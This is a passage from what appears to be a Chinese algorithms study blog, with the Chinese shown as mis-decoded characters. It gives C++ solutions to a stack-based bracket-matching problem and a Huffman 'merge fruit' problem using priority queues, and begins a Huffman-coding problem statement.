class="line">å¯¹æ¯ç»„è¾“å‡ºæ•°æ®ï¼Œè¾“å‡ºä¸¤è¡Œï¼Œç¬¬ä¸€è¡ŒåŒ…å«åŸå§‹è¾“å…¥å­—ç¬¦ï¼Œç¬¬äºŒè¡Œç”±<span class="string">&quot;<span class="variable">$</span>&quot;</span>,<span class="string">&quot;?&quot;</span>å’Œç©ºæ ¼ç»„æˆï¼Œ<span class="string">&quot;<span class="variable">$</span>&quot;</span>å’Œ<span class="string">&quot;?&quot;</span>è¡¨ç¤ºä¸ä¹‹å¯¹åº”çš„å·¦æ‹¬å·å’Œå³æ‹¬å·ä¸èƒ½åŒ¹é…ã€‚</span><br></pre></td></tr></table></figure><p>å…ˆæ­£åºï¼Œå†å€’åºå…¥æ ˆ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">string s;</span><br><span class="line"><span class="keyword">while</span>(cin &gt;&gt; s)&#123;</span><br><span class="line"><span class="keyword">int</span> len = s.<span class="built_in">size</span>();</span><br><span class="line"><span class="keyword">int</span> tag[len] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">stack&lt;<span class="keyword">char</span>&gt; st;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line">st.<span class="built_in">push</span>(s[i]);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">tag[i] = <span class="number">1</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">while</span> (!st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">        st.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; s&lt;&lt; endl;</span><br><span class="line"><span class="built_in">reverse</span>(s.<span class="built_in">begin</span>(), s.<span class="built_in">end</span>());</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27;)&#x27;</span>)&#123;</span><br><span class="line">st.<span class="built_in">push</span>(s[i]);</span><br><span class="line"><span class="keyword">continue</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(s[i] == <span class="string">&#x27;(&#x27;</span>)&#123;</span><br><span class="line"><span class="keyword">if</span>(st.<span class="built_in">empty</span>())&#123;</span><br><span class="line">tag[len - <span class="number">1</span> - i] = <span class="number">2</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">st.<span class="built_in">pop</span>();</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; len; i++)&#123;</span><br><span class="line"><span class="keyword">if</span>(tag[i] == <span class="number">0</span>)&#123;</span><br><span class="line">cout&lt;&lt;<span class="string">&quot; &quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span>(tag[i] == <span class="number">1</span>)&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;?&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">cout &lt;&lt; <span class="string">&quot;$&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="å“ˆå¤«æ›¼æ ‘"><a href="#å“ˆå¤«æ›¼æ ‘" class="headerlink" title="å“ˆå¤«æ›¼æ ‘"></a>å“ˆå¤«æ›¼æ ‘</h2><h3 id="åˆå¹¶æœå­"><a href="#åˆå¹¶æœå­" class="headerlink" title="åˆå¹¶æœå­"></a>åˆå¹¶æœå­</h3><h5 id="é¢˜ç›®æè¿°-12"><a href="#é¢˜ç›®æè¿°-12" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>åœ¨ä¸€ä¸ªæœå›­é‡Œï¼Œå¤šå¤šå·²ç»å°†æ‰€æœ‰çš„æœå­æ‰“äº†ä¸‹æ¥ï¼Œè€Œä¸”æŒ‰æœå­çš„ä¸åŒç§ç±»åˆ†æˆäº†ä¸åŒçš„å †ã€‚å¤šå¤šå†³å®šæŠŠæ‰€æœ‰çš„æœå­åˆæˆä¸€å †ã€‚ æ¯ä¸€æ¬¡åˆå¹¶ï¼Œå¤šå¤šå¯ä»¥æŠŠä¸¤å †æœå­åˆå¹¶åˆ°ä¸€èµ·ï¼Œæ¶ˆè€—çš„ä½“åŠ›ç­‰äºä¸¤å †æœå­çš„é‡é‡ä¹‹å’Œã€‚å¯ä»¥çœ‹å‡ºï¼Œæ‰€æœ‰çš„æœå­ç»è¿‡n-1æ¬¡åˆå¹¶ä¹‹åï¼Œå°±åªå‰©ä¸‹ä¸€å †äº†ã€‚å¤šå¤šåœ¨åˆå¹¶æœå­æ—¶æ€»å…±æ¶ˆè€—çš„ä½“åŠ›ç­‰äºæ¯æ¬¡åˆå¹¶æ‰€è€—ä½“åŠ›ä¹‹å’Œã€‚ å› ä¸ºè¿˜è¦èŠ±å¤§åŠ›æ°”æŠŠè¿™äº›æœå­æ¬å›å®¶ï¼Œæ‰€ä»¥å¤šå¤šåœ¨åˆå¹¶æœå­æ—¶è¦å°½å¯èƒ½åœ°èŠ‚çœä½“åŠ›ã€‚å‡å®šæ¯ä¸ªæœå­é‡é‡éƒ½ä¸º1ï¼Œå¹¶ä¸”å·²çŸ¥æœå­çš„ç§ç±»æ•°å’Œæ¯ç§æœå­çš„æ•°ç›®ï¼Œä½ çš„ä»»åŠ¡æ˜¯è®¾è®¡å‡ºåˆå¹¶çš„æ¬¡åºæ–¹æ¡ˆï¼Œä½¿å¤šå¤šè€—è´¹çš„ä½“åŠ›æœ€å°‘ï¼Œå¹¶è¾“å‡ºè¿™ä¸ªæœ€å°çš„ä½“åŠ›è€—è´¹å€¼ã€‚ ä¾‹å¦‚æœ‰3ç§æœå­ï¼Œæ•°ç›®ä¾æ¬¡ä¸º1ï¼Œ2ï¼Œ9ã€‚å¯ä»¥å…ˆå°†1ã€2å †åˆå¹¶ï¼Œæ–°å †æ•°ç›®ä¸º3ï¼Œè€—è´¹ä½“åŠ›ä¸º3ã€‚æ¥ç€ï¼Œå°†æ–°å †ä¸åŸå…ˆçš„ç¬¬ä¸‰å †åˆå¹¶ï¼Œåˆå¾—åˆ°æ–°çš„å †ï¼Œæ•°ç›®ä¸º12ï¼Œè€—è´¹ä½“åŠ›ä¸º12ã€‚æ‰€ä»¥å¤šå¤šæ€»å…±è€—è´¹ä½“åŠ›=3+12=15ã€‚å¯ä»¥è¯æ˜15ä¸ºæœ€å°çš„ä½“åŠ›è€—è´¹å€¼ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-10"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-10" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-12"><a href="#è¾“å…¥æè¿°-12" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥åŒ…æ‹¬ä¸¤è¡Œï¼Œç¬¬ä¸€è¡Œæ˜¯ä¸€ä¸ªæ•´æ•°<span class="selector-tag">n</span>(<span class="number">1</span>&lt;ï¼n&lt;=<span class="number">10000</span>)ï¼Œè¡¨ç¤ºæœå­çš„ç§ç±»æ•°ã€‚ç¬¬äºŒè¡ŒåŒ…å«<span class="selector-tag">n</span>ä¸ªæ•´æ•°ï¼Œç”¨ç©ºæ ¼åˆ†éš”ï¼Œç¬¬<span class="selector-tag">i</span>ä¸ªæ•´æ•°<span class="selector-tag">ai</span>(<span class="number">1</span>&lt;ï¼ai&lt;=<span class="number">20000</span>)æ˜¯ç¬¬<span class="selector-tag">i</span>ç§æœå­çš„æ•°ç›®ã€‚</span><br></pre></td></tr></table></figure><h6 id="è¾“å‡ºæè¿°-12"><a href="#è¾“å‡ºæè¿°-12" class="headerlink" title="è¾“å‡ºæè¿°:"></a>è¾“å‡ºæè¿°:</h6><figure class="highlight parser3"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="xml">è¾“å‡ºåŒ…æ‹¬ä¸€è¡Œï¼Œè¿™ä¸€è¡ŒåªåŒ…å«ä¸€ä¸ªæ•´æ•°ï¼Œä¹Ÿå°±æ˜¯æœ€å°çš„ä½“åŠ›è€—è´¹å€¼ã€‚è¾“å…¥æ•°æ®ä¿è¯è¿™ä¸ªå€¼å°äº</span><span class="number">2</span><span class="keyword">^31</span><span class="xml">ã€‚</span></span><br></pre></td></tr></table></figure><p>é¢˜ç›®å¾ˆå®¹æ˜“çœ‹å‡ºè´ªå¿ƒç­–ç•¥ï¼šæ¯æ¬¡åªåˆå¹¶æœ€å°çš„ä¸¤å †</p><p>ä½†æ˜¯æ¯æ¬¡åˆå¹¶åçš„å †è¿˜è¦æ”¾å›å»ï¼Œå¾—ä¿è¯æ”¾å›å»åæ•°æ®ä¾æ—§æœ‰åº</p><p>è¿™é‡Œä»‹ç»ä¸€ç§æ•°æ®ç»“æ„ï¼šä¼˜å…ˆé˜Ÿåˆ—ï¼Œå¤´æ–‡ä»¶#include <code>&lt;queue&gt;</code></p><p>è¿™ä¸ªé˜Ÿåˆ—å¼¹å‡ºå…ƒç´ ä¸æ˜¯æŒ‰ç…§å…¥é˜Ÿçš„å…ˆåï¼Œè€Œæ˜¯æŒ‰ç…§æƒå€¼çš„å¤§å°å‡ºé˜Ÿã€‚</p><p>å®šä¹‰ï¼š</p><p>priority_queue <code>&lt;int&gt;</code> q; å®šä¹‰é˜Ÿåˆ—qï¼Œæƒå€¼å¤§çš„å…ˆå‡ºé˜Ÿ</p><p>priority_queue <int, vector `<int><code>, greater</code><int>` &gt; q;æƒå€¼å°çš„å…ˆå‡ºé˜Ÿ</int></int,></p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;bits/stdc++.h&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line"><span class="keyword">int</span> n;</span><br><span class="line">cin &gt;&gt; n;</span><br><span class="line">priority_queue&lt;<span class="keyword">int</span>, vector&lt;<span class="keyword">int</span>&gt;, greater&lt;<span class="keyword">int</span>&gt; &gt; q;</span><br><span class="line"><span class="keyword">int</span> a, ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">cin &gt;&gt; a;</span><br><span class="line">q.<span class="built_in">push</span>(a);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(q.<span class="built_in">size</span>() &gt; <span class="number">1</span>)&#123;</span><br><span class="line"><span class="keyword">int</span> t1 = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">int</span> t2 = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line"><span class="keyword">int</span> t = t1 + t2;</span><br><span class="line">q.<span class="built_in">push</span>(t);</span><br><span class="line">ans += t;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">cout &lt;&lt; ans;</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>å…¶å®è¿˜æœ‰ä¸€ç§å†™æ³•ï¼Œè‡ªå·±å®šä¹‰èŠ‚ç‚¹å’Œæ“ä½œ</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span><span class="meta-string">&lt;queue&gt;</span></span></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">node</span> &#123;</span></span><br><span class="line"><span class="keyword">int</span> x;</span><br><span class="line"><span class="comment">// å®šä¹‰ä¼˜å…ˆé˜Ÿåˆ—çš„æ¯”è¾ƒå…³ç³»ï¼Œè¿™é‡Œæˆ‘ä»¬å®šä¹‰çš„æ˜¯å°æ ¹å † </span></span><br><span class="line"><span class="keyword">bool</span> <span class="keyword">operator</span> &lt; (<span class="keyword">const</span> node&amp; a) <span class="keyword">const</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> x &gt; a.x;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"><span class="keyword">int</span> n, x;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">scanf</span>(<span class="string">&quot;%d&quot;</span>, &amp;n) != EOF) &#123;</span><br><span class="line">priority_queue&lt;node&gt; q;</span><br><span class="line"><span class="keyword">while</span> (n--) &#123;</span><br><span class="line">cin &gt;&gt; x;</span><br><span class="line">q.<span class="built_in">push</span>(node&#123;x&#125;);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">int</span> ans = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (q.<span class="built_in">size</span>() &gt; <span class="number">1</span>) &#123;</span><br><span class="line">node num1 = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line">node num2 = q.<span class="built_in">top</span>();</span><br><span class="line">q.<span class="built_in">pop</span>();</span><br><span class="line">ans += num1.x + num2.x;</span><br><span class="line">q.<span class="built_in">push</span>(node&#123;num1.x + num2.x&#125;);</span><br><span class="line">&#125;</span><br><span class="line">cout &lt;&lt; ans &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="å“ˆå¤«æ›¼ç¼–ç "><a href="#å“ˆå¤«æ›¼ç¼–ç " class="headerlink" title="å“ˆå¤«æ›¼ç¼–ç "></a>å“ˆå¤«æ›¼ç¼–ç </h3><h5 id="é¢˜ç›®æè¿°-13"><a href="#é¢˜ç›®æè¿°-13" class="headerlink" title="é¢˜ç›®æè¿°"></a>é¢˜ç›®æè¿°</h5><p>ç†µç¼–ç å™¨æ˜¯ä¸€ç§æ•°æ®ç¼–ç æ–¹æ³•ï¼Œå®ƒé€šè¿‡å¯¹åˆ é™¤äº†â€œæµªè´¹â€æˆ–â€œå¤šä½™â€ä¿¡æ¯çš„æ¶ˆæ¯è¿›è¡Œç¼–ç æ¥å®ç°æ— æŸæ•°æ®å‹ç¼©ã€‚æ¢å¥è¯è¯´ï¼Œç†µç¼–ç é¦–å…ˆåˆ é™¤äº†å¯¹æ¶ˆæ¯è¿›è¡Œç²¾ç¡®ç¼–ç æ‰€ä¸éœ€è¦çš„ä¿¡æ¯ã€‚é«˜åº¦çš„ç†µæ„å‘³ç€ä¸€æ¡å¸¦æœ‰å¤§é‡æµªè´¹ä¿¡æ¯çš„æ¶ˆæ¯ã€‚ä»¥ASCIIç¼–ç çš„è‹±æ–‡æ–‡æœ¬æ˜¯å…·æœ‰éå¸¸é«˜çš„ç†µçš„æ¶ˆæ¯ç±»å‹çš„ç¤ºä¾‹ã€‚å·²ç»å‹ç¼©çš„æ¶ˆæ¯ï¼ˆä¾‹å¦‚JPEGå›¾å½¢æˆ–ZIPå½’æ¡£æ–‡ä»¶ï¼‰çš„ç†µå¾ˆå°ï¼Œå› æ­¤æ— æ³•ä»è¿›ä¸€æ­¥çš„ç†µç¼–ç å°è¯•ä¸­å—ç›Šã€‚</p><p>ç”¨ASCIIç¼–ç çš„è‹±æ–‡æ–‡æœ¬å…·æœ‰å¾ˆé«˜çš„ç†µï¼Œå› ä¸ºæ‰€æœ‰å­—ç¬¦éƒ½ä½¿ç”¨ç›¸åŒçš„ä½æ•°ï¼ˆå…«ä½ï¼‰è¿›è¡Œç¼–ç ã€‚ä¼—æ‰€å‘¨çŸ¥çš„äº‹å®æ˜¯ï¼Œä¸è‹±è¯­æ–‡æœ¬ä¸­å¤§å¤šæ•°å…¶ä»–å­—æ¯ç›¸æ¯”ï¼Œå­—æ¯Eï¼ŒLï¼ŒNï¼ŒRï¼ŒSå’ŒTçš„å‡ºç°é¢‘ç‡è¦é«˜å¾—å¤šã€‚å¦‚æœå¯ä»¥æ‰¾åˆ°ä¸€ç§ä»…ç”¨4ä½å¯¹è¿™äº›å­—æ¯è¿›è¡Œç¼–ç çš„æ–¹æ³•ï¼Œåˆ™æ–°çš„ç¼–ç å°†æ›´å°ï¼ŒåŒ…å«æ‰€æœ‰åŸå§‹ä¿¡æ¯å¹¶ä¸”ç†µæ›´å°‘ã€‚ ASCIIä¼šä½¿ç”¨å›ºå®šä½æ•°ï¼Œè¿™æ˜¯æœ‰åŸå› çš„ï¼šè¿™å¾ˆå®¹æ˜“ï¼Œå› ä¸ºä¸€ä¸ªäººæ€»æ˜¯å¤„ç†å›ºå®šä½æ•°æ¥è¡¨ç¤ºæ¯ä¸ªå¯èƒ½çš„å­—å½¢æˆ–å­—ç¬¦ã€‚å¯¹äºä¸Šè¿°å­—æ¯ä½¿ç”¨å››ä½çš„ç¼–ç æ–¹æ¡ˆå¦‚ä½•åŒºåˆ†å››ä½ä»£ç å’Œå…«ä½ä»£ç ï¼Ÿä½¿ç”¨æ‰€è°“çš„â€œæ— å‰ç¼€å¯å˜é•¿åº¦â€ç¼–ç å¯ä»¥è§£å†³è¿™ä¸ªçœ‹ä¼¼å›°éš¾çš„é—®é¢˜ã€‚</p><p>åœ¨è¿™ç§ç¼–ç ä¸­ï¼Œå¯ä»¥ä½¿ç”¨ä»»æ„æ•°é‡çš„ä½æ¥è¡¨ç¤ºä»»ä½•å­—å½¢ï¼Œå¹¶ä¸”æ¶ˆæ¯ä¸­ä¸å­˜åœ¨çš„å­—å½¢ä¹Ÿä¸ä¼šè¢«ç®€å•åœ°ç¼–ç ã€‚ä½†æ˜¯ï¼Œä¸ºäº†èƒ½å¤Ÿæ¢å¤ä¿¡æ¯ï¼Œä¸å…è®¸å°†ç¼–ç å­—å½¢çš„ä½æ¨¡å¼ä½œä¸ºä»»ä½•å…¶ä»–ç¼–ç ä½æ¨¡å¼çš„å‰ç¼€ã€‚è¿™å…è®¸å¯¹ç¼–ç çš„æ¯”ç‰¹æµè¿›è¡Œé€ä½è¯»å–ï¼Œå¹¶ä¸”åªè¦é‡åˆ°ä»£è¡¨å­—å½¢çš„ä¸€ç»„ä½ï¼Œå°±å¯ä»¥å¯¹è¯¥å­—å½¢è¿›è¡Œè§£ç ã€‚å¦‚æœæ²¡æœ‰å®æ–½æ— å‰ç¼€çº¦æŸï¼Œé‚£ä¹ˆè¿™æ ·çš„è§£ç å°†æ˜¯ä¸å¯èƒ½çš„ã€‚</p><p>è€ƒè™‘æ–‡å­—â€œ AAAAABCDâ€ã€‚ä½¿ç”¨ASCIIï¼Œå¯¹æ­¤è¿›è¡Œç¼–ç å°†éœ€è¦64ä½ã€‚ç›¸åï¼Œå¦‚æœæˆ‘ä»¬ç”¨ä½æ¨¡å¼â€œ 00â€ç¼–ç â€œ Aâ€ï¼Œç”¨â€œ 01â€ç¼–ç â€œ Bâ€ï¼Œç”¨â€œ 10â€ç¼–ç â€œ Câ€ï¼Œç”¨â€œ 11â€ç¼–ç â€œ Dâ€ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªèƒ½ç”¨16ä½ç¼–ç è¯¥æ–‡æœ¬ã€‚ä½;ç»“æœä½æ¨¡å¼å°†ä¸ºâ€œ 0000000000011011â€ã€‚ä½†æ˜¯ï¼Œè¿™ä»ç„¶æ˜¯å›ºå®šé•¿åº¦çš„ç¼–ç ã€‚æ¯ä¸ªå­—å½¢ä½¿ç”¨çš„æ˜¯ä¸¤ä½ï¼Œè€Œä¸æ˜¯å…«ä½ã€‚ç”±äºå­—å½¢â€œ Aâ€ä»¥æ›´é«˜çš„é¢‘ç‡å‡ºç°ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡ç”¨æ›´å°‘çš„æ¯”ç‰¹å¯¹å…¶è¿›è¡Œç¼–ç æ¥åšå¾—æ›´å¥½å—ï¼Ÿå®é™…ä¸Šæˆ‘ä»¬å¯ä»¥ï¼Œä½†æ˜¯ä¸ºäº†ä¿æŒæ— å‰ç¼€ç¼–ç ï¼Œå…¶ä»–ä¸€äº›ä½æ¨¡å¼å°†å˜å¾—æ¯”ä¸¤ä½é•¿ã€‚æœ€ä½³ç¼–ç æ˜¯ç”¨â€œ 0â€ç¼–ç â€œ Aâ€ï¼Œç”¨â€œ 10â€ç¼–ç â€œ Bâ€ï¼Œç”¨â€œ 110â€ç¼–ç â€œ Câ€ï¼Œç”¨â€œ 111â€ç¼–ç â€œ Dâ€ã€‚ ï¼ˆè¿™æ˜¾ç„¶ä¸æ˜¯å”¯ä¸€çš„æœ€ä½³ç¼–ç ï¼Œå› ä¸ºå¾ˆæ˜æ˜¾ï¼Œå¯¹äºBï¼ŒCå’ŒDçš„ç¼–ç å¯ä»¥åœ¨ä¸å¢åŠ æœ€ç»ˆç¼–ç æ¶ˆæ¯å¤§å°çš„æƒ…å†µä¸‹è‡ªç”±åœ°äº’æ¢ç”¨äºä»»ä½•ç»™å®šçš„ç¼–ç ã€‚ï¼‰ä½¿ç”¨è¿™ç§ç¼–ç ï¼Œæ¶ˆæ¯å¯ä»¥åœ¨â€œ 0000010110111â€åªæœ‰13ä½ï¼Œå‹ç¼©æ¯”ä¸º4.9ï¼š1ï¼ˆä¹Ÿå°±æ˜¯è¯´ï¼Œæœ€ç»ˆç¼–ç æ¶ˆæ¯ä¸­çš„æ¯ä¸ªä½ä»£è¡¨çš„ä¿¡æ¯ä¸åŸå§‹ç¼–ç ä¸­4.9ä½çš„ä¿¡æ¯ä¸€æ ·å¤šï¼‰ã€‚ä»å·¦åˆ°å³é€šè¯»æ­¤ä½æ¨¡å¼ï¼Œæ‚¨ä¼šå‘ç°ï¼Œå³ä½¿ä»£ç çš„ä½é•¿ä¸åŒï¼Œæ— å‰ç¼€ç¼–ç ä¹Ÿå¯ä»¥å¾ˆå®¹æ˜“åœ°å°†å…¶è§£ç ä¸ºåŸå§‹æ–‡æœ¬ã€‚</p><p>ä½œä¸ºç¬¬äºŒä¸ªç¤ºä¾‹ï¼Œè¯·è€ƒè™‘æ–‡å­—â€œå¸½å­é‡Œçš„çŒ«â€ã€‚åœ¨æœ¬æ–‡ä¸­ï¼Œå­—æ¯â€œ Tâ€å’Œç©ºæ ¼å­—ç¬¦å‡ä»¥æœ€é«˜é¢‘ç‡å‡ºç°ï¼Œå› æ­¤åœ¨æœ€ä½³ç¼–ç ä¸­ï¼Œå®ƒä»¬æ˜¾ç„¶å…·æœ‰æœ€çŸ­çš„ç¼–ç ä½æ¨¡å¼ã€‚å­—æ¯â€œ Câ€ï¼Œâ€œ Iâ€å’Œâ€œ Nâ€ä»…å‡ºç°ä¸€æ¬¡ï¼Œå› æ­¤å®ƒä»¬çš„ç¼–ç æœ€é•¿ã€‚</p><p>æœ‰è®¸å¤šå¯èƒ½çš„æ— å‰ç¼€å¯å˜é•¿åº¦ä½æ¨¡å¼é›†ï¼Œå®ƒä»¬å¯ä»¥äº§ç”Ÿæœ€ä½³ç¼–ç ï¼Œä¹Ÿå°±æ˜¯è¯´ï¼Œå…è®¸æ–‡æœ¬ä»¥æœ€å°‘çš„ä½æ•°è¿›è¡Œç¼–ç ã€‚ä¸€ç§è¿™æ ·çš„æœ€ä½³ç¼–ç æ˜¯ä½¿ç”¨â€œ 00â€ï¼Œâ€œ Aâ€å’Œâ€œ 100â€ï¼Œâ€œ Câ€å’Œâ€œ 1110â€ï¼Œâ€œ Eâ€å’Œâ€œ 1111â€ï¼Œâ€œ Hâ€å’Œâ€œ 110â€ï¼Œâ€œ Iâ€å’Œâ€œ 1010â€ï¼Œâ€œ Nâ€å’Œâ€œ 1011â€ä»¥åŠâ€œ Tâ€å’Œâ€œ 01â€ã€‚å› æ­¤ï¼Œæœ€ä½³ç¼–ç ä»…éœ€è¦51ä½ï¼Œè€Œä½¿ç”¨144ä½æ¶ˆæ¯ä»¥8ä½ASCIIç¼–ç ï¼ˆå‹ç¼©ç‡ä¸º2.8åˆ°1ï¼‰è¿›è¡Œç¼–ç æ—¶åˆ™éœ€è¦144ä½ã€‚</p><h5 id="è¾“å…¥è¾“å‡ºæ ¼å¼-11"><a href="#è¾“å…¥è¾“å‡ºæ ¼å¼-11" class="headerlink" title="è¾“å…¥è¾“å‡ºæ ¼å¼"></a>è¾“å…¥è¾“å‡ºæ ¼å¼</h5><h6 id="è¾“å…¥æè¿°-13"><a href="#è¾“å…¥æè¿°-13" class="headerlink" title="è¾“å…¥æè¿°:"></a>è¾“å…¥æè¿°:</h6><figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">è¾“å…¥æ–‡ä»¶å°†åŒ…å«æ–‡æœ¬å­—ç¬¦ä¸²åˆ—è¡¨ï¼Œæ¯è¡Œä¸€ä¸ªã€‚ æ–‡æœ¬å­—ç¬¦ä¸²å°†ä»…åŒ…å«å¤§å†™å­—æ¯æ•°å­—å­—ç¬¦å’Œä¸‹åˆ’çº¿ï¼ˆç”¨äºä»£æ›¿ç©ºæ ¼ï¼‰ã€‚ 